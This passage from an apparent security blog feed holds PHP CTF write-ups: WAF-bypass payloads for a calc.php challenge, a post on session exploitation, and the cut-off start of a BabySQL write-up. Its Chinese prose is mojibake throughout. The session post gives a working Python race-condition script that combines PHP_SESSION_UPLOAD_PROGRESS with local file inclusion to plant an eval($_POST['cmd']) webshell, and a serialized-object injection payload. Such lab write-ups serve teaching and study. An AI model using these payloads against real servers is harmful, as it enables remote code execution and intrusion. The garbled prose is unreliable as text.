<li>ä½äºæäº¤çš„å‚æ•°å‰é¢çš„<code>.</code>ä¼šè¢«æ›¿æ¢æˆ<code>_</code> ,
æäº¤<code>param=1&amp;..param2=2</code>,
æœ€ç»ˆåœ¨<code>$_REQUEST</code>é‡Œæ˜¯<code>("param1"=&gt;"1","__param2"=&gt;"2")</code></li>
<li>ä½äºå‚æ•°åä¸­é—´ã€æœ«å°¾ï¼Œæ— è®ºæ˜¯<code>[ç©ºæ ¼]</code>ã€<code>+</code>ã€<code>%20</code>è¿˜æ˜¯<code>.</code>éƒ½ä¼šè¢«æ›¿æ¢æˆ<code>_</code></li>
</ol>
</blockquote>
<p>è¿™ä¸ªWAFæˆ‘ä»¬å¯ä»¥é‡‡ç”¨åœ¨numå‰é¢åŠ ä¸ªç©ºæ ¼æ–¹å¼ç»•è¿‡, æ„é€ payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php? num=var_dump(scandir(chr(47))) </span><br><span class="line">//æœ¬é¢˜calc.php?%20num=var_dump(scandir(chr(47)))äº¦å¯</span><br></pre></td></tr></table></figure>
<p><code>scandir()</code>å¯ä»¥åˆ—å‡ºæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶,
ä½†æ˜¯<code>/</code>è¢«è¿‡æ»¤äº†,
æ‰€ä»¥ç”¨<code>chr()</code>å‡½æ•°,é‡‡ç”¨<code>ASCII</code>ç çš„æ–¹å¼ç»•è¿‡</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012021640.png"
alt="image-20211101202126567" />
<figcaption aria-hidden="true">image-20211101202126567</figcaption>
</figure>
<p>æ ¹ç›®å½•ä¸‹æœ‰ä¸ª<code>f1agg</code>,
æƒ³å¿…å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„<strong>flag</strong>äº†.</p>
<p>æ•…æŠ€é‡æ–½, ç”¨<code>chr()</code>å‡½æ•°æ‹¼å‡ºè·¯å¾„,
å†ç”¨<code>file_get_contents()</code>(ä¹Ÿå¯ä»¥ç”¨<code>highlight_file()</code>)è·å–é‡Œé¢çš„å†…å®¹,
payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012031550.png"
alt="image-20211101203110483" />
<figcaption aria-hidden="true">image-20211101203110483</figcaption>
</figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºPHP_SESSIONçš„æ¼æ´åˆ©ç”¨åŠå¤ç°</title>
    <url>/2023/04/05/%5BWeb%5D%E5%85%B3%E4%BA%8EPHP_SESSION%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="phpçš„åºåˆ—åŒ–å¤„ç†å™¨">PHPçš„åºåˆ—åŒ–å¤„ç†å™¨</h2>
<p><code>PHP</code>çš„åºåˆ—åŒ–å¤„ç†å™¨æœ‰ä¸‰ç§</p>
<ul>
<li><p><code>php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;abc&quot;</span>] = <span class="number">123</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;qwe&quot;</span>] = <span class="number">789</span>;</span><br><span class="line">    <span class="comment">//æŸ¥çœ‹sessionæ–‡ä»¶å†…å®¹ä¸º</span></span><br><span class="line">    <span class="comment">//abc|i:123;qwe|i:789;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>php_serialize</code></p>
<blockquote>
<p>PHP Version &gt;= 5.5.4</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;abc&quot;</span>] = <span class="number">123</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;qwe&quot;</span>] = <span class="number">789</span>;</span><br><span class="line">    <span class="comment">//æŸ¥çœ‹sessionæ–‡ä»¶å†…å®¹ä¸º</span></span><br><span class="line">    <span class="comment">//a:2:&#123;s:3:&quot;abc&quot;;i:123;s:3:&quot;qwe&quot;;i:789;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>php_binary</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;abc&quot;</span>] = <span class="number">123</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;qwe&quot;</span>] = <span class="number">789</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>session</code>æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051732264.png"
alt="image-20230405173209240" /></p></li>
</ul>
<p>ä»¥ä¸Šä¸‰ç§åºåˆ—åŒ–å¤„ç†å™¨çš„å¤„ç†æ–¹å¼(<code>KEY</code>ä»£è¡¨<code>$_SESSION</code>æ•°ç»„çš„é”®,
æ¯”å¦‚<code>abc</code>):</p>
<ul>
<li><code>php</code>
<ul>
<li><code>KEY</code>+<code>|</code>+<code>serialize($_Session["KEY"])</code>+<code>;</code></li>
</ul></li>
<li><code>php_serialize</code>
<ul>
<li><code>serialize($_Session)</code></li>
</ul></li>
<li><code>php_binary</code>
<ul>
<li><code>char(len(KEY))</code>+<code>KEY</code>+<code>serialize("KEY")</code>+<code>;</code></li>
</ul></li>
</ul>
<blockquote>
<p>serialize()å‡½æ•°çš„åºåˆ—åŒ–æ–¹å¼</p>
<p>[TO BE CONTINUE...]</p>
</blockquote>
<h2 id="phpçš„ä¼šè¯æœºåˆ¶">PHPçš„ä¼šè¯æœºåˆ¶</h2>
<h3 id="å·¥ä½œæ–¹å¼">å·¥ä½œæ–¹å¼</h3>
<p><code>PHP</code>é‡‡ç”¨<code>session</code>æ¥ä¿å­˜ä¸ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯,
å¦‚æœæœåŠ¡ç«¯å¼€å¯äº†<code>session</code>(é€šè¿‡<code>session_start()</code>),
å½“ç”¨æˆ·è®¿é—®é¡µé¢æ—¶, æœåŠ¡ç«¯ä¼šè¿”å›åä¸º<code>PHPSESSID</code>(é»˜è®¤å€¼,
å–å†³äº<code>session.name</code>)çš„<code>Cookie</code>.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//session.php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051551481.png"
alt="image-20230405155158450" />
<figcaption aria-hidden="true">image-20230405155158450</figcaption>
</figure>
<p>å¹¶ä¸”ä¼šåœ¨<code>session</code>çš„å‚¨å­˜ç›®å½•(å–å†³äº<code>session.save_path</code>,
æˆ‘è¿™é‡Œæ˜¯<code>~/tmp/</code>,
å› ä¸ºé€šè¿‡<code>docker</code>æ­å»ºçš„ç¯å¢ƒä¸ºäº†æ–¹ä¾¿,
æ‰€ä»¥æ˜ å°„åˆ°äº†å®¿ä¸»æœºçš„<code>~/mapping/tmp/</code>)ä¸‹ç”Ÿæˆåä¸º<code>sess_ + PHPSESSID</code>çš„æ–‡ä»¶</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051554166.png"
alt="image-20230405155451142" />
<figcaption aria-hidden="true">image-20230405155451142</figcaption>
</figure>
<p>æœåŠ¡ç«¯å¼€å¯<code>session</code>,
å¦‚æœç”¨æˆ·è®¿é—®æ—¶æ²¡æœ‰æºå¸¦<code>PHPSESSID</code>,
æœåŠ¡ç«¯ä¼šç”Ÿæˆä¸€ä¸ª<code>PHPSESSID</code>è¿”å›ç»™ç”¨æˆ·,
å¹¶åˆ›å»ºä¸€ä¸ª<code>$_SESSION</code>çš„å˜é‡,
æœåŠ¡ç«¯å¯ä»¥å°†å’Œç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯å­˜å‚¨åœ¨<code>$_SESSION</code>å˜é‡é‡Œ,
å½“æœ¬æ¬¡è¯·æ±‚æ‰§è¡Œå®Œæˆæ—¶,
<code>$_SESSION</code>å˜é‡å°†è¢«åºåˆ—åŒ–å¤„ç†å™¨(å–å†³äº<code>session.serialize_handler</code>)åºåˆ—åŒ–åå†™å…¥åˆ°<code>session</code>çš„å‚¨å­˜ç›®å½•ä¸­.
å½“ç”¨æˆ·ç¬¬äºŒæ¬¡è®¿é—®æ—¶, å°±ä¼šæºå¸¦ä¸Š<code>PHPSESSID</code>,
æœåŠ¡ç«¯æ ¹æ®<code>PHPSESSID</code>æ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶,
é€šè¿‡ååºåˆ—åŒ–å¤„ç†å™¨ååºåˆ—åŒ–åå°†æ‰€å¾—æ•°æ®å†æ¬¡å†™å›<code>$_SESSION</code>å˜é‡,
å®ç°ä¼šè¯çš„æ•°æ®ä¿å­˜.</p>
<p>æµ‹è¯•:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//counter.php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>]))</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>] += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿ç»­è®¿é—®15æ¬¡, æµè§ˆå™¨ä¾æ¬¡æ˜¾ç¤º1~15, æŸ¥çœ‹<code>session</code>æ–‡ä»¶</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062023525.png"
alt="image-20230406202353502" />
<figcaption aria-hidden="true">image-20230406202353502</figcaption>
</figure>
<p>å¦‚æœæœåŠ¡ç«¯æ²¡æœ‰æ‰“å¼€<code>session.use_strict_mode</code>(é»˜è®¤å…³é—­),
å¯ä»¥ä¸»åŠ¨æ§åˆ¶<code>PHPSESSID</code>çš„å€¼,
ä»è€Œæ§åˆ¶æœåŠ¡ç«¯<code>session</code>æ–‡ä»¶çš„åå­—,
åé¢å¯ä»¥é€šè¿‡è¿™ä¸ªç‰¹ç‚¹ç»“åˆæ–‡ä»¶åŒ…å«å®ç°ä¸Šä¼ æ¶æ„ä»£ç .</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051655109.png"
alt="image-20230405165505081" />
<figcaption aria-hidden="true">image-20230405165505081</figcaption>
</figure>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051654355.png" alt="image-20230405165443332" style="zoom: 80%;" /></p>
<h3 id="php_session_upload_progress">PHP_SESSION_UPLOAD_PROGRESS</h3>
<p>æœ‰æ—¶å€™, æœåŠ¡ç«¯å¹¶æ²¡æœ‰å¼€å¯<code>session</code>,
è¿™æ—¶å€™æƒ³é€šè¿‡å¸¸è§„æ–¹å¼å¾€æœåŠ¡å™¨å†™æ¶æ„çš„<code>session</code>æ–‡ä»¶å°±è¡Œä¸é€šäº†,
ä½†æ˜¯é€šå¸¸æƒ…å†µä¸‹,
æœåŠ¡å™¨ç«¯é»˜è®¤å¼€å¯äº†<code>session.upload_progress.enabled</code>è¿™ä¸ªé€‰é¡¹.
å½“è¿™ä¸ªé€‰é¡¹å¼€å¯æ—¶,
æ— è®ºæœåŠ¡ç«¯é¡µé¢æ˜¯å¦å¼€å¯<code>session</code>(æ ¹æ®PHPæ–‡æ¡£çš„è¯´æ³•,
è¿™ä¸ªåŠŸèƒ½çš„ä¼˜å…ˆçº§åœ¨è„šæœ¬æ‰§è¡Œä¹‹å‰),
æœåŠ¡ç«¯éƒ½ä¼šç”Ÿæˆ<code>PHPSESSID</code>å¹¶å°†<code>$_SESSION</code>å˜é‡å†™å…¥<code>session</code>å‚¨å­˜ç›®å½•.</p>
<p>ä¸Šä¼ é¡µé¢, <code>poc.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://vm-ubuntu.local/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æœåŠ¡ç«¯é¡µé¢, <code>index.php</code>, ä¸ºç©ºå°±è¡Œ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//Blank</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>éšä¾¿ä¸Šä¼ ä¸ªæ–‡ä»¶, æŠ“åŒ…æ·»åŠ ä¸€ä¸ª<code>Cookie: PHPSESSID=123</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062019121.png"
alt="image-20230406201929068" />
<figcaption aria-hidden="true">image-20230406201929068</figcaption>
</figure>
<p>çœ‹èµ·æ¥è²Œä¼¼ä»€ä¹ˆä¹Ÿæ²¡å‘ç”Ÿ,
ä½†æ˜¯æœåŠ¡ç«¯å®é™…ä¸Šå·²ç»åˆ›å»ºäº†ä¸€ä¸ªåä¸º<code>sess_123</code>çš„<code>session</code>çš„æ–‡ä»¶,
ç„¶åè¿…é€Ÿåˆ æ‰äº†.</p>
<p>å†™ä¸ªè„šæœ¬å¿«é€Ÿåœ°ä¸Šä¼ , äº§ç”Ÿç«äº‰, å°±å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, ALL_COMPLETED, wait</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">32</span>)</span><br><span class="line">task_list = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://vm-ubuntu.local/index.php&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=123&quot;</span>&#125;</span><br><span class="line">        data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;something&quot;</span>&#125;</span><br><span class="line">        files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;blank.bin&quot;</span>, io.BytesIO(<span class="string">b&#x27;\xcc&#x27;</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#125;</span><br><span class="line">        requests.post(url=url,</span><br><span class="line">                        headers=headers,</span><br><span class="line">                        data=data,</span><br><span class="line">                        files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">     task_list.append(pool.submit(upload))</span><br><span class="line">wait(task_list, return_when=ALL_COMPLETED)</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062021631.png"
alt="image-20230406202133601" />å¯ä»¥å‘ç°, å¯æ§å†…å®¹çš„åœ°æ–¹æœ‰å¾ˆå¤šå¤„,
åªéœ€è¦åˆ©ç”¨å…¶ä¸­ä¸€å¤„, å†å’Œæ–‡ä»¶åŒ…å«æ¼æ´ç»“åˆèµ·æ¥,
å°±å¯ä»¥å®ç°æ¶æ„ä»£ç æ‰§è¡Œ.</p>
<h3
id="php_session_upload_progressç»“åˆlfi">PHP_SESSION_UPLOAD_PROGRESSç»“åˆLFI</h3>
<p>å…ˆåˆ›å»ºä¸€ä¸ªæœ‰æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´çš„é¡µé¢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//lfi.php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]))</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ”¹é€ ä¸€ä¸‹è„šæœ¬, ä½¿å…¶èƒ½å¤Ÿé€šè¿‡ç«äº‰å°†æ¶æ„ä»£ç æ‰§è¡Œ,
å‰ææ˜¯çŸ¥é“<code>session</code>çš„å‚¨å­˜ä½ç½®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, ALL_COMPLETED, wait</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">32</span>)</span><br><span class="line">task_list = []</span><br><span class="line"></span><br><span class="line">payload = <span class="string">r&quot;&quot;&quot;&lt;?php eval(&quot;fwrite(fopen(&#x27;shell.php&#x27;, &#x27;wb&#x27;), &#x27;&lt;?php @eval(\$_POST[\\&#x27;cmd\\&#x27;]); ?&gt;&#x27;);&quot;); ?&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://vm-ubuntu.local/index.php&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=123&quot;</span>&#125;</span><br><span class="line">        data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: payload&#125;</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&quot;blank.bin&quot;</span>, io.BytesIO(<span class="string">b&#x27;\xcc&#x27;</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#125;</span><br><span class="line">        requests.post(url=url,</span><br><span class="line">                      headers=headers,</span><br><span class="line">                      data=data,</span><br><span class="line">                      files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_shell</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://vm-ubuntu.local/lfi.php&quot;</span></span><br><span class="line">        params = &#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;/tmp/sess_123&quot;</span>&#125;</span><br><span class="line">        requests.get(url=url, params=params)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    task_list.append(pool.submit(upload))</span><br><span class="line">    task_list.append(pool.submit(write_shell))</span><br><span class="line">wait(task_list, return_when=ALL_COMPLETED)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>äºæ˜¯å°±å¯ä»¥æˆåŠŸå†™å…¥<code>webshell</code>.</p>
<h2 id="ååºåˆ—åŒ–æ¼æ´">ååºåˆ—åŒ–æ¼æ´</h2>
<h3
id="é”™è¯¯ç»„åˆä¸åŒçš„åºåˆ—åŒ–å¤„ç†å™¨å¯¼è‡´æ¼æ´">é”™è¯¯ç»„åˆä¸åŒçš„åºåˆ—åŒ–å¤„ç†å™¨å¯¼è‡´æ¼æ´</h3>
<p><code>PHP</code>åºåˆ—åŒ–å’Œååºåˆ—åŒ–<code>$_SESSION</code>å˜é‡çš„æ–¹å¼ç”±<code>session.serialize_handler</code>å†³å®š,
<code>php_serialize</code>åœ¨<strong>5.5.4åŠä»¥ä¸Š</strong>çš„ç‰ˆæœ¬æ‰å¯ç”¨,
å¦‚åœ¨ä¸€ä¸ªé¡µé¢é‡‡ç”¨<code>php_serialize</code>è¿›è¡Œåºåˆ—åŒ–,
è€Œå¦ä¸€ä¸ªé¡µé¢é‡‡ç”¨<code>php</code>æ¥ååºåˆ—åŒ–,
å°±ä¼šå¯¼è‡´<code>session</code>æ³¨å…¥æ¼æ´.</p>
<p>å®ä¾‹:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//pageA.php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php_serialize&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;name&quot;</span>] = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;age&quot;</span>] = <span class="variable">$_GET</span>[<span class="string">&quot;age&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//pageB.php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vul</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$greet</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Exploited&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;greet.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="keyword">new</span> <span class="title class_">Vul</span>();</span><br><span class="line">    <span class="variable">$i</span>-&gt;greet = <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$i</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¯·æ±‚<code>pageA.php</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062154304.png"
alt="image-20230406215450264" />
<figcaption aria-hidden="true">image-20230406215450264</figcaption>
</figure>
<p>æŸ¥çœ‹<code>session</code>æ–‡ä»¶</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062155433.png"
alt="image-20230406215515412" />
<figcaption aria-hidden="true">image-20230406215515412</figcaption>
</figure>
<p>å¯ä»¥é€šè¿‡æ§åˆ¶<code>name</code>æˆ–è€…<code>age</code>çš„å€¼æ¥å®ç°æ³¨å…¥,
åœ¨å‰é¢åŠ ä¸Š<code>|</code>,
<code>php</code>åºåˆ—åŒ–å¤„ç†å™¨å°±ä¼šè®¤ä¸º<code>|</code>å‰é¢çš„æ˜¯é”®,
åé¢æ˜¯é”®å¯¹åº”çš„å€¼åºåˆ—åŒ–åçš„å†…å®¹.</p>
<p>æ„é€ URL:
<code>http://vm-ubuntu.local/pageA.php?name=abc&amp;age=|O:3:"Vul":1:&#123;s:5:"greet";s:6:"Hahaha";&#125;;</code></p>
<p>è¯·æ±‚ä¹‹åå†æ¬¡æŸ¥çœ‹<code>session</code>æ–‡ä»¶</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062156062.png"
alt="image-20230406215648038" />
<figcaption aria-hidden="true">image-20230406215648038</figcaption>
</figure>
<p>æ­¤æ—¶å†å»è¯·æ±‚<code>pageB.php</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062158377.png"
alt="image-20230406215830337" />
<figcaption aria-hidden="true">image-20230406215830337</figcaption>
</figure>
<p>æˆåŠŸçš„è°ƒç”¨äº†<code>pageB.php</code>é‡Œ<code>Vul</code>ç±»çš„<code>__wakeup()</code>æ–¹æ³•,
å¹¶å®ç°äº†æ§åˆ¶å¯¹è±¡å†…éƒ¨å˜é‡çš„å€¼.</p>
<blockquote>
<p>å…³äºè¿™ä¸ªè¾“å‡ºæ˜¯æ€ä¹ˆæ¥çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exploited    //å¯¹sessionæ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–å‰è°ƒç”¨__wakeup()</span><br><span class="line">O:3:&quot;Vul&quot;:1:&#123;s:5:&quot;greet&quot;;s:6:&quot;Hello!&quot;;&#125;    //echo serialize($i).&quot;&lt;br/&gt;&quot; çš„è¾“å‡º</span><br><span class="line">Hello!        //æ‰§è¡Œç»“æŸ, å˜é‡$iææ„çš„æ—¶å€™è°ƒç”¨__destruct()å‡½æ•°</span><br><span class="line">Hahaha        //æ‰§è¡Œç»“æŸ, $_SESSIONå˜é‡ä¸­çš„å¯¹è±¡ææ„çš„æ—¶å€™è°ƒç”¨__destruct()å‡½æ•°</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>å‚è€ƒ:</p>
<ol type="1">
<li><a href="https://cloud.tencent.com/developer/article/2035863">æµ…è°ˆ
SESSION_UPLOAD_PROGRESS çš„åˆ©ç”¨ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘
(tencent.com)</a></li>
<li><a
href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html">phpåºåˆ—åŒ–
- l3m0n - åšå®¢å›­ (cnblogs.com)</a></li>
<li><a href="https://xz.aliyun.com/t/6640">å¸¦ä½ èµ°è¿›PHP
sessionååºåˆ—åŒ–æ¼æ´ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></li>
<li><a
href="https://www.php.net/manual/zh/session.upload-progress.php">PHP:
Session ä¸Šä¼ è¿›åº¦ - Manual</a></li>
</ol>
</blockquote>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>PHP</tag>
        <tag>PHPååºåˆ—åŒ–</tag>
        <tag>PHP_SESSION</tag>
      </tags>
  </entry>
  <entry>
    <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL 1</title>
    <url>/2021/11/02/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL-1/</url>
    <content><![CDATA[<p>å—¯, ç†Ÿæ‚‰çš„å‘³é“.</p>
<figure>
<img
